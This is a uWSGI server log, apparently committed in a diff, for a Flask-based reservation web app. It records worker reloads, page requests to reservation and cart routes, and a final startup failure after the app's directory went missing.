+spawned uWSGI worker 2 (pid: 29915, cores: 2)
+spawned uWSGI worker 3 (pid: 29916, cores: 2)
+spawned uWSGI worker 4 (pid: 29917, cores: 2)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a857d9fd30 pid: 29916 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a857d9fd30 pid: 29915 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a857d9fd30 pid: 29917 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55a857d9fd30 pid: 29914 (default app)
+[pid: 29914|app: 0|req: 1/1] 223.104.63.195 () {46 vars in 834 bytes} [Fri Jul 10 00:43:18 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 29914|app: 0|req: 2/2] 223.104.63.195 () {46 vars in 834 bytes} [Fri Jul 10 00:43:30 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+Fri Jul 10 00:46:46 2020 - *** /home/ubuntu/DietSystem/ReservationSystem/visible has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 29914)...
+Gracefully killing worker 2 (pid: 29915)...
+Gracefully killing worker 3 (pid: 29916)...
+Gracefully killing worker 4 (pid: 29917)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from visible_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Jul 10 00:46:47 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x562fd7f9dd30
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16041)
+spawned uWSGI worker 1 (pid: 30679, cores: 2)
+spawned uWSGI worker 2 (pid: 30680, cores: 2)
+spawned uWSGI worker 3 (pid: 30681, cores: 2)
+spawned uWSGI worker 4 (pid: 30682, cores: 2)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562fd7f9dd30 pid: 30680 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562fd7f9dd30 pid: 30681 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562fd7f9dd30 pid: 30682 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562fd7f9dd30 pid: 30679 (default app)
+[pid: 30679|app: 0|req: 1/1] 223.104.63.195 () {46 vars in 834 bytes} [Fri Jul 10 00:46:49 2020] GET /reserve_user => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+[pid: 30681|app: 0|req: 1/2] 223.104.63.195 () {44 vars in 775 bytes} [Fri Jul 10 00:46:53 2020] GET /reserve => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 2/3] 223.104.63.195 () {46 vars in 904 bytes} [Fri Jul 10 00:47:12 2020] GET /reserve => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 30679|app: 0|req: 3/4] 223.104.63.195 () {46 vars in 910 bytes} [Fri Jul 10 00:51:37 2020] GET /management => generated 3864 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 1)
+[pid: 30682|app: 0|req: 1/5] 223.104.63.195 () {46 vars in 914 bytes} [Fri Jul 10 00:51:53 2020] GET /reserve_user => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 30681|app: 0|req: 2/6] 223.104.63.195 () {46 vars in 904 bytes} [Fri Jul 10 00:51:57 2020] GET /reserve => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 30679|app: 0|req: 4/7] 223.104.63.195 () {46 vars in 906 bytes} [Fri Jul 10 00:52:39 2020] GET /now_cart => generated 4910 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 5/8] 223.104.63.195 () {46 vars in 908 bytes} [Fri Jul 10 00:53:21 2020] GET /now_order => generated 3295 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 6/9] 80.82.77.240 () {30 vars in 355 bytes} [Fri Jul 10 00:58:56 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 30682|app: 0|req: 2/10] 223.104.63.195 () {46 vars in 906 bytes} [Fri Jul 10 00:59:03 2020] GET /now_user => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 30681|app: 0|req: 3/11] 223.104.63.195 () {46 vars in 904 bytes} [Fri Jul 10 00:59:12 2020] GET /nowaday => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 7/12] 223.104.63.195 () {46 vars in 904 bytes} [Fri Jul 10 01:03:20 2020] GET /nowaday => generated 5065 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 242 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 8/13] 223.104.63.195 () {46 vars in 904 bytes} [Fri Jul 10 01:05:08 2020] GET /nowaday => generated 4739 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 247 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 9/14] 223.104.63.195 () {46 vars in 914 bytes} [Fri Jul 10 01:06:23 2020] GET /reserve_cart => generated 5759 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 1)
+[pid: 30679|app: 0|req: 10/15] 223.104.63.195 () {46 vars in 914 bytes} [Fri Jul 10 01:06:32 2020] GET /reserve_cart => generated 5759 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 0)
+[pid: 30682|app: 0|req: 3/16] 223.104.63.195 () {48 vars in 959 bytes} [Fri Jul 10 01:06:35 2020] GET /reserve_user => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+Fri Jul 10 01:07:06 2020 - *** /home/ubuntu/DietSystem/ReservationSystem/visible has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 30679)...
+Gracefully killing worker 2 (pid: 30680)...
+Gracefully killing worker 3 (pid: 30681)...
+Gracefully killing worker 4 (pid: 30682)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from visible_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Jul 10 01:07:07 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x560cd3fe9d30
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16041)
+spawned uWSGI worker 1 (pid: 928, cores: 2)
+spawned uWSGI worker 2 (pid: 929, cores: 2)
+spawned uWSGI worker 3 (pid: 930, cores: 2)
+spawned uWSGI worker 4 (pid: 931, cores: 2)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560cd3fe9d30 pid: 929 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560cd3fe9d30 pid: 928 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560cd3fe9d30 pid: 930 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560cd3fe9d30 pid: 931 (default app)
+Fri Jul 10 01:07:44 2020 - *** /home/ubuntu/DietSystem/ReservationSystem/visible has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 928)...
+Gracefully killing worker 2 (pid: 929)...
+Gracefully killing worker 3 (pid: 930)...
+Gracefully killing worker 4 (pid: 931)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from visible_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Jul 10 01:07:45 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56380fe82d30
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16041)
+spawned uWSGI worker 1 (pid: 1019, cores: 2)
+spawned uWSGI worker 2 (pid: 1020, cores: 2)
+spawned uWSGI worker 3 (pid: 1021, cores: 2)
+spawned uWSGI worker 4 (pid: 1025, cores: 2)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x56380fe82d30 pid: 1025 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x56380fe82d30 pid: 1020 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x56380fe82d30 pid: 1021 (default app)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x56380fe82d30 pid: 1019 (default app)
+[pid: 1019|app: 0|req: 1/1] 223.104.63.195 () {48 vars in 959 bytes} [Fri Jul 10 01:07:48 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 1019|app: 0|req: 2/2] 223.104.63.195 () {46 vars in 914 bytes} [Fri Jul 10 01:07:51 2020] GET /reserve_cart => generated 5759 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 0)
+[pid: 1025|app: 0|req: 1/3] 223.104.63.195 () {48 vars in 959 bytes} [Fri Jul 10 01:07:58 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 1019|app: 0|req: 3/4] 223.104.63.195 () {48 vars in 959 bytes} [Fri Jul 10 01:08:29 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 1019|app: 0|req: 4/5] 223.104.63.195 () {46 vars in 916 bytes} [Fri Jul 10 01:08:58 2020] GET /reserve_order => generated 4244 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 0)
+[pid: 1025|app: 0|req: 2/6] 223.104.63.195 () {48 vars in 960 bytes} [Fri Jul 10 01:09:02 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 1019|app: 0|req: 5/7] 223.104.63.195 () {48 vars in 960 bytes} [Fri Jul 10 01:11:11 2020] GET /reserve_user => generated 14295 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 251 bytes (0 switches on core 1)
+[pid: 1019|app: 0|req: 6/8] 223.104.63.195 () {46 vars in 898 bytes} [Fri Jul 10 01:12:18 2020] GET /site => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+[pid: 1019|app: 0|req: 7/9] 223.104.63.195 () {46 vars in 898 bytes} [Fri Jul 10 01:12:37 2020] GET /user => generated 3973 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 243 bytes (0 switches on core 0)
+[pid: 1019|app: 0|req: 8/10] 223.104.63.195 () {48 vars in 951 bytes} [Fri Jul 10 01:12:40 2020] GET /reserve_user => generated 14295 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 251 bytes (0 switches on core 1)
+[pid: 1019|app: 0|req: 9/11] 34.78.221.53 () {34 vars in 372 bytes} [Fri Jul 10 01:38:48 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+Fri Jul 10 01:56:04 2020 - *** /home/ubuntu/DietSystem/ReservationSystem/visible has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 1019)...
+Gracefully killing worker 2 (pid: 1020)...
+Gracefully killing worker 3 (pid: 1021)...
+Gracefully killing worker 4 (pid: 1025)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/DietSystem/ReservationSystem/visible
+uwsgi_reload()/chdir(): No such file or directory [core/master_utils.c line 453]
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (172.17.0.3:5000)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from visible_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Jul 10 01:56:05 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/OrangeOsmanthus/visible
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5637b3694d30
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16041)
+spawned uWSGI worker 1 (pid: 7958, cores: 2)
+spawned uWSGI worker 2 (pid: 7959, cores: 2)
+spawned uWSGI worker 3 (pid: 7960, cores: 2)
+spawned uWSGI worker 4 (pid: 7961, cores: 2)
+unable to stat() /home/ubuntu/DietSystem/ReservationSystem/visible, events will be triggered as soon as the file is created
+failed to open python file /home/ubuntu/DietSystem/ReservationSystem/visible/flask_visible.py
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+failed to open python file /home/ubuntu/DietSystem/ReservationSystem/visible/flask_visible.py
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+failed to open python file /home/ubuntu/DietSystem/ReservationSystem/visible/flask_visible.py
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+failed to open python file /home/ubuntu/DietSystem/ReservationSystem/visible/flask_visible.py
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
